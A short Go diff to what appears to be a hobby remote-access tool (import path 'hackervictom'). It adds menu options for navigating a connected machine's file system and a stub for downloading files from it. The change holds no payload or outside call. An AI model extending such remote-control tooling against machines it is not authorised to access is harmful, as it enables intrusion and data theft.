@@ -3,6 +3,7 @@ package main
 import (
 	"JayneJacobs/hackervictom/core/executecommandwin"
 	"JayneJacobs/hackervictom/core/handleconnection"
+	"JayneJacobs/hackervictom/core/move"
 	"bufio"
 	"encoding/gob"
 	"fmt"
@@ -37,7 +38,7 @@ func main() {
 
 	for loopControl {
 
-		fmt.Printf("[+] Enter Options")
+		fmt.Printf("[+] Entered Options \n")
 		userinputraw, err := reader.ReadString('\n')
 		if err != nil {
 			fmt.Println(err)
@@ -53,6 +54,12 @@ func main() {
 			if err != nil {
 				DisplayError(err)
 			}
+		case "2":
+			fmt.Println("[+] File System Navigation")
+			err := move.Navigate(connection)
+			DisplayError(err)
+		case "3":
+			fmt.Println("[+] Downloading file from Server ")
 		case "99":
 			fmt.Println("[+] Exiting windows")
 			loopControl = false
